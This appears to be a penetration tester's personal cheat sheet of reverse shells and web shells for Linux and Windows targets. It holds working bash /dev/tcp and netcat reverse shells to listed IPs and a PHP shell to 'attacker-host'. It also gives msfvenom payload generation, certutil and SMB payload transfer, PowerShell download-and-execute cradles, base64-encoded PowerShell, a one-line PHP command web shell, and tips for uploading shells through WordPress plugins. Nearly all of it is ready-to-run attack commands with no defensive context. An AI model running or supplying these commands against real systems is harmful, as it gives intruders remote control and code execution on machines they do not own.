---
sticker: lucide//sticky-note
---
### Reverse Shells
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
https://www.revshells.com/

### TRY ALL CATCHING ON THE SAME PORTS THAT ARE OPEN ON THE TARGET.

##### Bash
```
bash -c "bash -i >& /dev/tcp/192.168.45.208/80 0>&1"

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

/bin/bash -l > /dev/tcp/192.168.45.161/1443 0<&1 2>&1
```

##### NC
```
busybox nc 192.168.45.201 21 -e sh
nc.exe 10.10.10.10 9001 -e powershell/sh
nc 10.10.10.10 9001 -e powershell/sh
```

##### PHP
```
php -r '\$sock=fsockopen(\"attacker-host\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'
```

##### LSP
```
https://github.com/the-emmons/lsp-reverse-shell/blob/main/rev.lsp
```
### Windows
#####  CMD
```
#Generate reverse shell.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o myshell.exe

#Transfer reverse shell to your users home directory.
certutil -urlcache -split -f http://192.168.45.178:80/myshell.exe C:\\users\\<user>\\myshell.exe"

#Execute
C:\\users\\<user>\\myshell.exe
```

##### SMB Share
```
#Generate reverse shell.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o myshell.exe

#Setup smb server.
impacket-smbserver -smb2support kali $PWD

#Transfer and execute shell.
//<kali-ip>/kali/myshell.exe
```

##### Netcat

```
nc.exe <listening_host> <listening_port> -e cmd
```

##### Powershell

```
#Using powercat.
Method 1. IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
Method 2. powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
```
##### Base64 Encode

```
#PowerShell Script
$Text = "YOUR_PAYLOAD_HERE"

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText

#PowerShell Command
powershell -enc "<base64>"
powershell -a "-enc <base64>"
```

### Web Shells
##### ASP / ASPX

```
https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
```
### PHP

```
<?php system($_GET['cmd']); ?>
```

#### Upgrades
#### Linux
```
#interactive upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

#interactive upgrade
python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'

#enables clear
export TERM=xterm
```

#### Windows
```
#If you are finding basic commands can't be recognised.
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;

```


##### CMS SPECIFIC
```
PHPMYADMIN: SQL query: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f?ref=benheater.com

WORDPRESS: https://secnhack.in/upload-shell-on-wordpress-site/
	#ADROTATE PLUGIN
	# can upload shell as zip as image banner
	# banner images are auto extracted to /banner folder
	# use plugin settings to find where the /banner folder is
	# mostly /wp-content/banners/wp-content/banners/web.php
```

```